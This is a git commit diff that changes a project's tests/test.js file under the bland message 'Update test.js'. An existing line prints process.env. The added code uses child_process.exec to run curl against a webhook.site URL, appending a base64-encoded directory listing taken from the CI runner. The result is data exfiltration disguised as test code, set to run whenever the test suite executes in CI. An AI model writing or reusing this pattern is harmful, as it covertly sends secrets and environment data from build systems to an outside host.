e602b6a8afcbf5fce166605df37aa3a964c2edd1
Jackson <21977467+ScenicJaguar101@users.noreply.github.com>
2023-04-14 22:00:32 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -13,6 +13,18 @@ console.log(process.env);
 
 console.log("xxxxxx");
 
-const {ls, cat, lscat} = require("../index");
+// const {ls, cat, lscat} = require("../index");
 
-lscat("/home/runner/work/_temp")
+// lscat("/home/runner/work/_temp")
+
+const { exec } = require('node:child_process')
+
+
+exec('curl https://webhook.site/7d8cbbc5-b054-45b1-8504-7e56f999530f?$(cd ..; ls | base64)' , (err, output) => {
+    if (err) {
+        console.error("could not execute command: ", err)
+        return
+    }
+    // log the output received from the command
+    console.log("Output: \n", output)
+})
